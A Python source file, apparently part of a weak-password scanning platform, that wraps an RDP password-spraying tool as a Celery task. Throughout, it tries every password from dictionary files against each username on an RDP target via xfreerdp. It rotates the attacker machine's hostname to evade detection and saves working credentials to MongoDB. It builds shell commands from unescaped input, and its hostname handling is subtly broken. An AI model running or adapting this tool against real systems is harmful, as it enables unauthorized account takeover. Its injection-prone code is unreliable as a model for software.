# Based on the research and POC made by Beau Bullock (@dafthack),
# https://github.com/dafthack/RDPSpray This version was written by @x_Freed0m tested with Kali
# linux against 2012 DC escape chars in password with \ - e.g P\@ssword\!\#

import socket
import subprocess
import sys
import time
from random import randint
from select import select
from celery_tasks.main import app
from conf.global_config import RDP_DIC_USER, RDP_DIC_PASSWD
from utils.mongo_op import MongoDB
import json



def orig_hostname():  # saving the original hostname to revert to
    global orighostname
    orighostname = socket.gethostname()
    return orighostname

def exception(incoming_err):
    # LOGGER.critical("[!] Exception: " + str(incoming_err))
    # LOGGER.info('[*] Resetting to the original hostname')
    subprocess.call("hostnamectl set-hostname '%s'" % orighostname, shell=True)
    return

def userlist(incoming_userlist):
    try:
        with open(incoming_userlist) as f:
            usernames = f.readlines()
        generated_usernames_stripped = [incoming_userlist.strip() for incoming_userlist in usernames]
    except Exception as e:
        print(e)

    return generated_usernames_stripped

def passwordlist(incoming_passwordlist):
    with open(incoming_passwordlist) as pass_obj:
        return [p.strip() for p in pass_obj.readlines()]

def fake_hostnames(hostnames_list):
    with open(hostnames_list) as f:
        hostnames = f.readlines()
    fake_hostnames_stripped = [hostname.strip() for hostname in hostnames]
    generated_hostname_counter = 0
    hostname_looper = len(fake_hostnames_stripped) - 1
    return fake_hostnames_stripped, generated_hostname_counter, hostname_looper

def locked_input(question, possible_answer, default_ans, timeout=5):  # asking the user if to
    # proceed when a locked user is identified, to prevent further lockouts
    # LOGGER.warning('%s(%s):' % (question, possible_answer))
    rlist, _, _ = select([sys.stdin], [], [], timeout)
    if rlist:
        return sys.stdin.readline().strip()
    return default_ans

def attempts(users, passes, target, domain, output_file_name, hostnames_stripped, sleep_time,
             hostname_loop, random, min_sleep, max_sleep):

    success_login_yes_rdp = b"Authentication only, exit status 0"
    account_locked = b"ERRCONNECT_ACCOUNT_LOCKED_OUT"
    account_disabled = b"ERRCONNECT_ACCOUNT_DISABLED [0x00020012]"
    account_expired = b"ERRCONNECT_ACCOUNT_EXPIRED [0x00020019]"
    success_login_no_rdp = [b'0x0002000D', b'0x00000009']
    failed_to_conn_to_server = [b'0x0002000C', b'0x00020006']
    pass_expired = [b'0x0002000E', b'0x0002000F', b'0x00020013']
    failed_login = [b'0x00020009', b'0x00020014']

    attempts_hostname_counter = 0
    working_creds_counter = 0
    result = {'RDP':{
        'service':'RDP',
        'port': '',
        'payload':[]
    }}
    try:
        # print(
        #     "[*] Started running at: %s" % datetime.datetime.now().strftime('%d-%m-%Y %H:%M:%S'))
        # output('Status', 'Username', 'Password', output_file_name)
        for password in passes:
            for username in users:
                subprocess.call(
                    "hostnamectl set-hostname '%s'" % hostnames_stripped[attempts_hostname_counter],
                    shell=True)
                spray = subprocess.Popen(
                    "xfreerdp /v:'%s' +auth-only /d:%s /u:%s /p:%s /sec:nla /cert-ignore" % (
                        target, domain, username, password), stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE, shell=True)
                output_error = spray.stderr.read()
                output_info = spray.stdout.read()
                # throttling requests
                if random is True:
                    sleep_time = random_time(min_sleep, max_sleep)
                    time.sleep(float(sleep_time))
                else:
                    time.sleep(float(sleep_time))
                if any(word in output_error for word in failed_to_conn_to_server):
                    # LOGGER.error(
                    #     "[-] Failed to establish connection, check target RDP availability.")
                    # LOGGER.info('[*] Resetting to the original hostname')
                    subprocess.call("hostnamectl set-hostname '%s'" % orighostname, shell=True)
                    return
                elif any(word in output_error for word in failed_login):
                    status = 'Invalid'
                    # output(status, username, password, output_file_name)
                    # LOGGER.debug("[-]Creds failed for: " + username)
                elif account_locked in output_error:
                    status = 'Locked'
                    # output(status, username, password, output_file_name)
                    # LOGGER.warning("[!] Account locked: " + username)
                    answer = locked_input('%s is Locked, do you wish to resume? (will '
                                          'auto-continue without answer)' % username, 'Y/n',
                                          'y').lower()
                    if answer == 'n':
                        # LOGGER.error("Stopping the tool")
                        # LOGGER.info('[*] Resetting to the original hostname')
                        subprocess.call("hostnamectl set-hostname '%s'" % orighostname, shell=True)
                        return
                elif account_disabled in output_error:
                    status = 'Disabled'
                    # output(status, username, password, output_file_name)
                    working_creds_counter += 1
                    # LOGGER.warning(
                    #     "[*] Creds valid, but account disabled: " + username + " :: " + password)
                elif any(word in output_error for word in pass_expired):
                    status = 'Password Expired'
                    # output(status, username, password, output_file_name)
                    working_creds_counter += 1
                    # LOGGER.warning(
                    #     "[*] Creds valid, but pass expired: " + username + " :: " + password)
                elif account_expired in output_error:
                    status = 'Account expired'
                    # output(status, username, password, output_file_name)
                    working_creds_counter += 1
                    # LOGGER.warning(
                    #     "[*] Creds valid, but account expired: " + username + " :: " + password)
                elif any(word in output_error for word in success_login_no_rdp):
                    status = 'Valid creds WITHOUT RDP access'
                    # output(status, username, password, output_file_name)
                    working_creds_counter += 1
                elif success_login_yes_rdp in output_error:
                    status = 'Valid creds WITH RDP access (maybe even local admin!)'
                    working_creds_counter += 1
                    print(
                        "[+] Cred successful (maybe even Admin access!): " + username + " :: " +
                        password)
                    result['RDP']['payload'].append({'username':username, 'password':password})
                else:
                    status = 'Unknown status, check the log file'
                    # print(status)

                if attempts_hostname_counter < hostname_loop:  # going over different fake hostnames
                    attempts_hostname_counter += 1
                else:
                    attempts_hostname_counter = 0
        #
        print(result)
        # print("[*] Overall compromised accounts: %s" % working_creds_counter)
        # print(
        #     "[*] Finished running at: %s" % datetime.datetime.now().strftime('%d-%m-%Y %H:%M:%S'))
        # subprocess.call("hostnamectl set-hostname '%s'" % orighostname, shell=True)
        return result

    except Exception as attempt_err:
        exception(attempt_err)

    except KeyboardInterrupt:
        # LOGGER.critical("[!] [CTRL+C] Stopping the tool")
        # LOGGER.info('[*] Resetting to the original hostname')
        subprocess.call("hostnamectl set-hostname '%s'" % orighostname, shell=True)
        return

def apt_get_xfreerdp():
    try:
        ver = subprocess.Popen("xfreerdp /version", stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                               shell=True)
        xfreerdp_version_output = ver.stdout.read()
        if b'This is FreeRDP ' in xfreerdp_version_output:
            return 0
        else:
            print("[-] xfreerdp wasn't identified. please run 'apt-get install xfreerdp'")
            return
    except Exception as xfreerdp_err:
        exception(xfreerdp_err)
    except KeyboardInterrupt:
        # LOGGER.critical(" [CTRL+C] Stopping the tool")
        # LOGGER.info('[*] Resetting to the original hostname')
        subprocess.call("hostnamectl set-hostname '%s'" % orighostname, shell=True)
        return

def random_time(minimum, maximum):
    sleep_amount = randint(minimum, maximum)
    return sleep_amount


def main(taskID, target):
    # logo()
    random = False
    min_sleep, max_sleep = 0, 0
    usernames_stripped, passwords_stripped = [], []
    # args = args_parse()
    # print(args.domain, args.output)
    orig_hostname()
    apt_get_xfreerdp()
    # configure_logger(args.verbose)

    try:
        usernames_stripped = userlist(RDP_DIC_USER)
    except Exception as err:
        exception(err)

    try:
        passwords_stripped = passwordlist(RDP_DIC_PASSWD)
    except Exception as err:
        exception(err)
    hostnames_stripped = orig_hostname()
    ## TODO  添加domain作为目标的支持

    hostname_loop = len(hostnames_stripped) - 1
    total_accounts = len(usernames_stripped)
    total_passwords = len(passwords_stripped)
    total_attempts = total_accounts * total_passwords
    # print("Total number of users to test: " + str(total_accounts))
    # print("Total number of password to test: " + str(total_passwords))
    # print("Total number of attempts: " + str(total_attempts))

    result = attempts(usernames_stripped, passwords_stripped, target, None, 'RDPassSpray',
             hostnames_stripped, 0, hostname_loop, random, min_sleep, max_sleep)
    return result

@app.task(bind=True,name='RDPassSpray')
# 可以非阻塞执行
def RDPassSpray(self, taskID, target):
    _ = main(taskID, target)
    mon = MongoDB()
    mon.add_weak_pass_service(taskID, json.dumps(_))   # 最终一定要在主task函数中调用 Mongo存储， 同时方便return
    return _
if __name__ == '__main__':
    main('a', '10.0.83.217')

# TODO: replace shell commands with better alternative
# TODO: get more status codes
# TODO: maybe add threads for speed?
# TODO: check ability to support hash instead of password
